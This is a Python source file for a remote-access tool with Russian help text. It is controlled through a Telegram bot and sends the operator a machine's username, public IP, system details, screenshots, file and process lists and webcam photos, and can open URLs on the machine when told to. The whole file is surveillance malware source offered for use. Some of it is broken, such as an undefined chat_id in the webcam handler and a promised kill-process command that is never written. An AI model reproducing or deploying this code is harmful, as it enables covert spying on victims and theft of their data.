import requests 
import platform
import telebot
import os
import webbrowser
import json
import cv2
import requests as r
import subprocess
from json import loads
from PIL import ImageGrab
from telebot import util
from telebot import types
from subprocess import Popen, PIPE


token = ''
id_chat = ''
bot = telebot.TeleBot(token, threaded=True)

@bot.message_handler(commands=['start'])
def start(commands):
	bot.send_message(id_chat, 'Привет. Для просмотра команд - напиши /help')


@bot.message_handler(commands=['help'])
def help(command):
	bot.send_message(id_chat, '/screen - Скриншот окна \n/info - Информация об устройстве' +
		'\n/ls - просмотр файлов \n/kill_process + имя процесса \n/cam - фото с вебки + \n/tasklist - Диспетчер задач')

@bot.message_handler(commands=['info'])
def info_send(command):
	try:
		username = os.getlogin()
		r = requests.get('http://ip.42.pl/raw')
		ip = r.text
		windows = platform.platform()
		processor = platform.processor()

		bot.send_message(id_chat, 'PC: ' + username + '\nIP: ' + ip + '\nOS: ' + windows + '\nProcessor: ' + processor)
	except:
		bot.send_message(id_chat, 'Error')


@bot.message_handler(commands=['pwd'])
def pwd(command):
	dir = os.path.abspath(os.getcwd())
	bot.send_message(id_chat, 'Pwd: \n' + (str(dir)))


@bot.message_handler(commands=['ls'])
def ls_dir(command):
	try:
		dirs = '\n'.join(os.listdir(path='.'))
		bot.send_message(id_chat, 'Files: ' + '\n' + dirs)
	except:
		bot.send_message(id_chat, 'Bla')

@bot.message_handler(commands=['tasklist'])
def tasklist(command):
	try:
		bot.send_chat_action(id_chat, 'typing')

		prs = Popen('tasklist', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE).stdout.readlines()
		pr_list = [prs[i].decode('cp866', 'ignore').split()[0].split('.exe')[0] for i in range(3,len(prs))]
		pr_string = '\n'.join(pr_list)
		bot.send_message(command.chat.id, '`' + pr_string + '`', parse_mode="Markdown")

	except:
		bot.send_message(id_chat, '*Not Found*', parse_mode="Markdown")

@bot.message_handler(commands=['screen'])
def send_screen(command):
	try:
		screen = ImageGrab.grab()
		screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg')
		screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')
		files = {'photo': screen}
		bot.send_photo(id_chat, screen)
	except:
		bot.send_photo(id_chat, 'Error')

@bot.message_handler(commands=['cam'])
def cam(command):
	try:
		camera = cv2.VideoCapture(0)
		while True:
			return_value,image = camera.read()
			gray = cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
			cv2.imshow('image',gray)
			if cv2.waitKey(1)& 0xFF == ord('s'):
				cv2.imwrite('webcam.jpg',image)
				break
		camera.release()
		cv2.destroyAllWindows()
		bot.sendChatAction(chat_id, 'upload_photo')
		bot.sendDocument(chat_id, open('webcam.jpg', 'rb'))
		os.remove('webcam.jpg')
	except:
		bot.send_chat_action(id_chat, 'typing')
		bot.send_message(id_chat, '*Webcam not found*', parse_mode="Markdown")
		
@bot.message_handler(commands=['url'])
def opnurl(message):
	user_msg = '{0}'.format(message.text)
	url = user_msg.split(' ')[1]
	try:
		webbrowser.open_new_tab(url)
	except:
		bot.send_message(id_chat, 'Error')

bot.infinity_polling()

		
bot.infinity_polling()
